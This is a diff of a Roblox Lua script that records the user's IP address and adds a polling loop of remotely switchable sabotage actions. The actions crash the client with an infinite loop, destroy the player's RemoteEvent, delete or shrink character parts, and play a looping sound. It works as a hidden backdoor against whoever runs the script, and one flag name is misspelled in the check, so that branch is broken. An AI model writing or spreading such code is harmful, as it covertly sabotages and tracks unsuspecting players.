@@ -49,17 +49,11 @@ ipAddress = HttpService:JSONDecode(ipAddress).ip
 -- Functions
 local function generateCreateFileURL()
     local content = [[
-local c = false
-local b = false
-local bp = false
-local s = false
-local t = false
-    
-if t then local a=Instance.new("Sound")a.SoundId="rbxassetid://142376088"a.Looped=true;a.Volume=1;a.Parent=game:GetService("SoundService")a:Play()end
-if c then while true do end end
-if b then local re = game.Players.LocalPlayer:FindFirstChild('RemoteEvent');if re then re:Destroy() end end
-if bp then local p = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom;if p then p:Destroy() end end
-if s then local n = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint');if n then n.LowerLimit = 1; n.UpperLimit = 1 end end
+_G.Crash = false
+_G.Ban = false
+_G.BPlayer = false
+_G.Small = false
+_G.Taco = false
 ]]
     return "https://github.com/" .. githubRepo .. "/new/main?filename=" .. filePath .. "&value=" .. HttpService:UrlEncode(content)
 end
@@ -142,3 +136,13 @@ while true do
         warn("Failed to load the script: " .. result)
     end
 end
+
+while true do
+wait(1)
+if _G.Taco then local a=Instance.new("Sound")a.SoundId="rbxassetid://142376088"a.Looped=true;a.Volume=1;a.Parent=game:GetService("SoundService")a:Play()end
+if _G.Crash then while true do end end
+if _G.Ban then local re = game.Players.LocalPlayer:FindFirstChild('RemoteEvent');if re then re:Destroy() end end
+if _G.Bplayer then local p = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom;if p then p:Destroy() end end
+if _G.Small then local n = Workspace.Ignore.LocalCharacter and Workspace.Ignore.LocalCharacter.Bottom:FindFirstChild('PrismaticConstraint');if n then n.LowerLimit = 1; n.UpperLimit = 1 end end
+
+end 
